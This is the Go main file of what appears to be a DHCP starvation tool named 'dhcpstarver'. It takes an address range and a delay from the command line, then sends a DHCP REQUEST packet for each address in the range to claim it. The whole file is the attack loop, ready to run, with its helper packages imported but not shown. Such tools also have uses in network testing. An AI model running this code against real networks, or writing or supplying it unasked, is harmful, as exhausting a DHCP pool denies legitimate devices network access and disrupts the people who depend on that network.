package main

import (
	"log"
	"time"

	"github.com/Bogdante/dhcpstarver/args"
	"github.com/Bogdante/dhcpstarver/dhcp"
	"github.com/Bogdante/dhcpstarver/networking"
)

func main() {
	_, startAddr, endAddr, delay := args.ParseCmdArguments()
	client, err := networking.CreateNewClient()

	if err != nil {
		panic("Cant Create Client")
	}

	defer client.CloseConnection()

	for i := startAddr; i.IsLessOrEqual(endAddr); i.Next() {
		pack, err := dhcp.CreateDhcpRequestPackage(*i)

		if err != nil {
			log.Printf("Error creating DHCP REQUEST PACKAGE with %d last byte ...", i)
		}

		err = client.SendBuffer(pack)

		if err != nil {
			log.Printf("Error sending buffer with reserved last byte %d ...", i)
		}

		time.Sleep(time.Duration(delay) * time.Millisecond)
	}
}
